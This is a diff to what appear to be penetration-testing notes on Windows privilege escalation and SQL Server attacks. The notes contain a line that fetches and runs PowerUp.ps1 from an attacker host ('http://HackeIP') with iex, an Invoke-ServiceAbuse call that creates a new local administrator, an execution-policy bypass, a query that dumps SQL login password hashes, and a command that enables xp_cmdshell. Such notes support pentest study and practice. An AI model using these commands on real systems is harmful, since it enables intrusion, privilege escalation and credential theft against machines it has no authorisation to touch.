@@ -107,8 +107,10 @@
         For each service check if user can write in the service Path 
               ==> icacls “Path”
     
-    - Using powerUp.ps1 script in https://powersploit.readthedocs.io/en/latest/Privesc/
+    - Using powerUp.ps1 script in https://powersploit.readthedocs.io/en/latest/Privesc/    
         - Import the script to the Victim in Powershell ==> iex (New-Object Net.WebClient).DownloadString('http://HackeIP/PowerUp.ps1')
+        - Import-Module .\Privesc
+        - Get-Command -Module Powerup
         - Run Invoke-AllChecks
         - Take note of the AbuseFunction (example : PriviligedService)
         - Use the PriviligedService to run any OS Command for example create new Admin user : Invoke-ServiceAbuse -Name PriviligedService  -UserName testUser -Password password_123 -LocalGroup "Administrators"
@@ -125,6 +127,10 @@
     https://github.com/itm4n/PrivescCheck
     powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 
+
+
+
+    
     ##### 6.1.2.4 Useful command
     reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
     reg query "HKCU\Software\Policies\Microsoft\Windows\Installer"
@@ -221,6 +227,7 @@ gobuster dir -u http://targetIp -w /usr/share/wordlists/dirb/common.txt -b
     https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
 
     ##### 10.2.2 Sql Server
+        
         select name,password_hash from master.sys.sql_logins; -- check the database users 
         select loginname from syslogins where sysadmin = 1; -- check the database users 
         enable_xp_cmdshell;  -- enable command exec
